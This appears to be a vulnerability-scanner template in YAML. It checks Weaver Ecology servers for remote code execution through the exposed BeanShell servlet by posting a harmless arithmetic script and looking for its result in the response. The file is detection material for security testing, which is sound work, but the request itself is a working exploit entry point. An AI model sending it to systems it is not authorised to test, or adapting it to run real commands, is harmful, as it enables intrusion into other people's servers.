id: poc-yaml-ecology-javabeanshell-rce
info:
  name: Ecology Javabeanshell 远程代码执行漏洞
  severity: high
  tags:
  - rce
  finger: Ecology Javabeanshell
  reference: []
  description: null
variables:
  r1: random_int(40000, 44800)
  r2: random_int(40000, 44800)
transport: http
requests:
- method: POST
  path: /weaver/bsh.servlet.BshServlet
  headers: {}
  data: bsh.script=print%28{{.r1}}*{{.r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, r1 * r2)
  output: []
